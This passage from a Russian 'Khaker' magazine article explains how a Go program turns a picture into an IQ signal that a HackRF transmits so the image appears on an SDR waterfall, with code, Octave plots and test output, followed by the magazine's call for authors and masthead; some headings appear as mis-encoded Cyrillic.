каждую стро ку в массив с яркостью пикселей. Каждую строку повторяем
необходимое количество раз, что бы она была в эфире нужное нам время
и как сле дует отрисовалась на водопаде. После конвертации и повторения
строк пре образуем мас сивы со строками в сигналы и записываем их в нуж-
ном формате в файл.


Ðàçáèðàåì êàðòèíêó
Что бы про читать кар тинку, в Go уже есть встро енные биб лиотеки image. Я
под клю чу библиотеки для фор матов GIF, JPEG и PNG, хотя, разумеется, ты
можешь добавить и другие.


package main


import (
    "flag"
    "fmt"
    _ "image/gif"
    _ "image/jpeg"
    _ "image/png"
    "log"


    waterfoolImage "waterfool/v2/src/image"
)


func main() {
    imagePath := flag.String("image", "image.png", "image to convert"
)
    flag.Parse()


    img, err := waterfoolImage.ReadImage(*imagePath)
    if err != nil {
        log.Panic(err)
    }


  // Число точек преобразования Фурье. Равно ширине картинки, то
есть длине одной строки
    NFFT := img.Bounds().Max.X
    repetitions := waterfoolImage.Repetitions(NFFT)
    brightnessImg := waterfoolImage.ConvertImageToBrightnessArray(img
, repetitions)
    brightnessImgReversed := waterfoolImage.FlipVertically(
brightnessImg)
    waterfoolImage.GrayMatrixToSignals(brightnessImgReversed,
"output.iq8s", NFFT)
}

В коде я нем ного забежал вперед и написал сразу всю функцию main().
Остальные  функции мы  раз берем  ниже,  попутно  проверяя,  как  все
это работа ет.
  В начале нуж но просто прочитать картинку, что делается в функции
ReadImage. Каждый элемент массива — это строка пикселей.


func ReadImage(imagePath string) (image.Image, error) {
    file, err := os.Open(imagePath)
    if err != nil {
        return nil, err
    }
    defer file.Close()


    img, _, err := image.Decode(file)
    if err != nil {
        return nil, err
    }


    return img, nil
}

Са мая простая из наших функций — это прос то чтение кар тинки. Открываем
файл, читаем, возвращаем результат.


func ConvertImageToBrightnessArray(img image.Image, repetition int)
[][]float64 {
    imageWidth := img.Bounds().Dx()
    imageHeight := img.Bounds().Dy() * repetition
    brightnessMatrix := make([][]float64, imageHeight)


    for y := 0; y < imageHeight; y++ {
        brightnessMatrix[y] = make([]float64, imageWidth)
        for x := 0; x < imageWidth; x++ {
            originalY := (y / repetition) + img.Bounds().Min.Y
            r, g, b, _ := img.At(x, originalY).RGBA()
            brightness := (0.299*float64(r>>8) + 0.587*float64(g>>8)
+ 0.114*float64(b>>8))
            brightnessMatrix[y][x] = brightness
        }
    }
    return brightnessMatrix
}

Фун кция преобразования картинки из цветной в яркостную уже более инте-
ресна. Самый прос той способ преобра зовать RGB-цвет в яркость — при-
менить фор мулу для перево да в цветовое прос транство YUV, но использовать
мы будем только компоненту Y. Выглядит она следующим образом:


brightness = 0.299*R + 0.587*G + 0.114*B

Каж дое значение у меня сдви гает ся впра во на 8 (что эквивалентно делению
на 256), что бы значения в результате не превышали 255 и влезали в один
байт. Также в этой функции учитываются пов торения — тре буемое их
количество на строку передается в аргумен тах фун кции. Математика пов-
торений крайне проста:


func Repetitions(NFFT int) int {
    return int(float64(freq) * lineTime / float64(NFFT))
}

Умножаем частоту дис кретизации на задан ное нами время и делим на число
точек пре обра зования, которое в нашем случае рав но размеру кар тинки.
Получив количество повторений, просто повторяем строку с пикселями необ-
ходимое нам число раз, что бы получи лось нуж ное на одну строку время.
И округляем, потому что число пов торений дол жно быть обя зательно целым.
Забегая впе ред, скажу, что для большинства картинок хорошо подходит дли-
тель ность одной стро ки в 0,01 с.
  Соберем код в одну кучу и проверим, корректно ли все работает. Я тес-
тирую программу на картинке с одной стро кой, так что добавил небольшой
отладоч ный вывод, что бы оценить, как прог рамма пре образует цвета.



  $ go run cmd/waterfool/main.go -image 1row.png
  2024/03/30 04:16:21
  [[255 255 255 255 255 255 255 255 255 255 166 119 119 47 0 0 0 0 0 0 0 0
   0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 47 119 187 255 255 255 255 255 25
  5 255 255 255 166 119 119 119 119 119 47 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
   0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
   0 0 0 0 0 47 119 119 166 255 255 255 255 255 255 255 255 255 255 255 25
  5 213 136 47 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
   0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 47 121 205 255 255 255 255 255
  255 255 255 255 255 255 255 255 247 175.99999999999997 136 47 0 0 0 0 0
  0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0


В начале у меня яркая зона, затем темная, потом опять яркая и так далее.
Для боль шей нагляднос ти можно запустить вывод в файл, тогда на кар те кода
мы должны уви деть нашу картинку как ASCII-арт из цифр. Для пущей наг-
лядности при несем в жертву программе картинку кота.





                 У кота аж пиксели све тятся от счастья

Ко та четко видно, хотя и не целиком — пря чется!


Ñîáèðàåì ñïåêòð
Те перь перей дем непос редственно к работе со спектром. У нас уже есть мат-
рица с яркостью всех пик селей, и теперь из нее нуж но только сге нери ровать
сиг нал, который мы потом отпра вим с HackRF.
   Начнем с тестового изоб ражения. Я соз дал PNG размером 320    1, то
есть все го одна стро ка, и нарисовал там белые учас тки, чтобы потом было
лег ко рассмот реть их на спектре.





Все го шесть полосок, которые мы и будем искать на водопаде. Перейдем
теперь к реали зации.


func MatrixToSignals(brightnessMatrix [][]float64, outputPath string,
NFFT int) {
    file, err := os.Create(outputPath)
    if err != nil {
        return
    }
    defer file.Close()


    for index, imageRow := range brightnessMatrix {
        spectrum := prepareSpectrum(imageRow, NFFT)
        timeSignal := fft.IFFT(spectrum)
        for _, val := range timeSignal {
            i := real(val)
            q := imag(val)
            file.Write([]byte{uint8(i), uint8(q)})
        }
    }
}


Для начала программа откры вает файл, в который будет записы ваться
результат для HackRF. Дальше проходим по матрице с яркостью пикселей
(brightnessMatrix). Каждую строку нуж но подготовить, перед тем как прев-
ратить в сигнал с помощью обратного пре образова ния Фурье. Этим занима-
ется функция prepareSpectrum, которая при нимает строку и конечный раз-
мер сигнала — количество точек преобразова ния Фурье.


func prepareSpectrum(imageRow []float64, NFFT int) []complex128 {
    spectrum := make([]complex128, NFFT)


    for i, amp := range imageRow {
        phase := (float64(NFFT) + rand.Float64()*(float64(NFFT))) * 2
* math.Pi
        spectrum[i] = cmplx.Rect(amp, phase)
    }


    return spectrum
}

В самой функции соз даем массив комплексных чисел. Про ходя по стро ке,
для каждой амплитуды генерируем свою случайную фазу и сох раня ем ампли-
туду и фазу в массив спектра.
  После обработ ки каждой строки все получившиеся значения приводятся
к uint8 и записывают ся в файл. Так как все значения у нас уже от 0 до 255, то
даже пре образовы вать ничего не нуж но, просто передаем их напрямую
в функцию Write().
  Не будем углублять ся в алго ритм сохранения сигнала в файл, так как весь
смысл сох ранения — это перевод комплексных чисел в uint8 и запись
на диск.
  В целом все понятно, давай посмотрим теперь, какой сигнал генери руется
пос ле этой функции, и исследуем его в Octave. Добавим небольшой код пос-
ле ifft в функции MatrixToSignal.


if index == 0 {
    for _, i := range timeSignal {
        fmt.Println(real(i))
    }
}



  $ go run cmd/waterfool/main.go -image 1row.png
  ...600958,0.03571476212811692,-0.0003735044026043679,0.00081516933106350
  47,0.0022184753433024547,-0.010361459381957438,0.0006176081883488185,-0.
  0010268762750873684,-0.0017262408223864766,0.007508156273533283,0.003996
  5048812498054,-0.03337287134600915,-0.024608506973970497,-0.017445897301
  67126,0.0016205568665210279,0.0265336118415809,-0.0394703755702079,-0.03
  3246717203558,-0.028585764343979025,-0.022926954442742502,0.016920892199
  293863,-0.04566089157261759,-0.026768135802805855,-0.014614170075202377,
  -0.02137115112426234,0.012153815843680539,-0.04226266992832104,-0.022837
  55626852157,-0.01723002473942125,-0.024944210161337337,0.009031808029088
  694,-0.0170090191449942,0.0...


В консоль выводятся реальные части нашего сиг нала, по ним мы можем пос-
мотреть форму сиг нала и его спектр. Что бы сделать это, вернемся к Octave. Я
под готовил малень кий скрипт, чтобы изучать сигналы.


signal = []


length(signal);
t = 1:length(signal);


spectrum = fft(signal);
N = length(spectrum);
freq = (0:N-1)*(1/N);


subplot(2, 1, 1);
plot(t, signal);
title('Сигнал');
xlabel('Время');
ylabel('Амплитуда');


subplot(2, 1, 2);
bar(freq(1:N/2), abs(spectrum(1:N/2)));
title('Спектр');
xlabel('Частота');
ylabel('Амплитуда');

Под ставь вывод из консоли в массив signal и запусти. На выходе ты дол жен
получить сигнал и его спектр. Давай запустим и пос мотрим, что будет.





Спектр, отрисованный Octave, пов торяет форму рисунка. Как ты можешь
заметить, амплитуда не пре вышает единицу, а длительность сигнала равна
ширине картинки. Этот сигнал — только одна строка нашего изображения,
которую мы будем выводить нес колько раз.


ÒÅÑÒÛ

Протес тируем мы на двух HackRF, один из которых будет в виде PortaPack.




                         PortaPack  —   это   аппа ратное   допол нение
                       для HackRF. Оно позволя ет использовать SDR
                       без ПК, как пор тативное устройство. По сути,
                      добавляет ся экран, спе циаль ное ПО и батарея.
                         PortaPack отлично подходит для экспериментов
                        в поле, так как с ним не нужно всегда носить
                        с собой ноут бук.


Для теста попробуем в цикле передать нашу строку и пос мотреть на спектр.
Запускаем переда чу:



  $ hackrf_transfer -t output.iq8s -f 250000000 -s 2000000 -x 45 -a 1 -R
  call hackrf_set_sample_rate(2000000 Hz/2.000 MHz)
  call hackrf_set_hw_sync_mode(0)
  call hackrf_set_freq(250000000 Hz/250.000 MHz)
  call hackrf_set_amp_enable(1)
  Stop with Ctrl-C
   3.9 MiB / 1.000 sec =  3.9 MiB/second, average power -32.1 dBfs
   3.9 MiB / 1.000 sec =  3.9 MiB/second, average power -32.1 dBfs
   3.9 MiB / 1.000 sec =  3.9 MiB/second, average power -32.1 dBfs
   4.2 MiB / 1.000 sec =  4.2 MiB/second, average power -32.1 dBfs
   3.9 MiB / 1.000 sec =  3.9 MiB/second, average power -32.1 dBfs
   3.9 MiB / 1.000 sec =  3.9 MiB/second, average power -32.1 dBfs
   3.9 MiB / 1.000 sec =  3.9 MiB/second, average power -32.1 dBfs
   4.2 MiB / 1.000 sec =  4.2 MiB/second, average power -32.1 dBfs
   3.9 MiB / 1.000 sec =  3.9 MiB/second, average power -32.1 dBfs
   3.9 MiB / 1.000 sec =  3.9 MiB/second, average power -32.1 dBfs
   3.9 MiB / 1.000 sec =  3.9 MiB/second, average power -32.1 dBfs
  ^CCaught signal 2
   3.1 MiB / 0.749 sec =  4.2 MiB/second, average power -32.1 dBfs


  Exiting...
  Total time: 11.74886 s
  hackrf_stop_tx() done
  hackrf_close() done
  hackrf_exit() done
  fclose() done
  exit


Вклю чаем передачу с одной SDR и смотрим водопад на другой на час-
тоте 251 МГц. Выг лядит это, как на картинке ниже.





Как видим, все шесть красных полосок на мес те, а значит, наше изображение
в одну строку корректно превратилось в сигнал из спектра и теперь мы
можем пос мотреть его на водопа де! Давай поп робуем что-то пос ложнее.
Возьмем обычную картинку в формате PNG.





Все работа ет! Можно, конечно, подкрутить немного количество повторений
строки, но, кажется, и так выглядит хорошо.


ÂÛÂÎÄÛ

Код, конечно, не иде ален и требует некото рых доработок (например, сдвига
спектра в начало и кор ректи ров ку амплитуд к цен тру), но это не помешало
нам получить работающий proof of concept рисовалки на водопа де. Успе хов
в повторении эксперимен та!
«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.




Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
   №4 (301)

          Андрей Письмен ный    Вален тин Холмогоров        Илья Русанен
              Главный редактор         Ведущий редактор             Разработка
               pismenny@glc.ru          valentin@holmogorov.ru          rusanen@glc.ru
                      Ев гения Шарипова           yambuto
                        Литературный редактор         Бильд-редак тор
                                                   yambuto@gmail.com


                          MEGANEWS

                           Мария Нефёдо ва
                                            nefedova@glc.ru


                    КОНСУЛЬТАЦИОННЫЙ СОВЕТ

                                 Иван Андреев, Олег Афонин,
                                   Марк Бруцкий-Стем-
                                      пковский, Алексей Глазков,
                                            Nik Zerof, Юрий Язев


                             РЕКЛАМА

                                  Анна Яковлева
                                  Директор по спец проектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                       Вопросы о подписке:      Воп росы о материалах:
                                 lapina@glc.ru               support@glc.ru





Учредитель: ИП Яков лева Анна Вадимов на ИНН 503806735948 ОГРН/ОГРНИП 320508100264021. Адрес: 141271, Россия, Москов ская область,
Пушкино, мкр Соф рино-1, дом 28, квартира 58. Телефон: +7(980)4591655. Зарегис трирова но Федераль ной службой по надзору в сфере связи,
информа цион ных технологий и массовых коммуникаций (Роскомнадзоре), свидетельство ЭЛ № ФС 77 — 73894 от 12.10.2018 года. Мнение
редакции не обя зательно совпадает с мнением авторов. Все матери алы в номере предоставля ются как информа ция к раз мышлению. Лица,
использующие данную информа цию в про тиво законных целях, могут быть прив лечены к ответственности. Редакция не несет ответственности
за содержание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование редакционных материалов
журнала обращайтесь по адресу: content@glc.ru. © Журнал «Хакер», РФ, 2024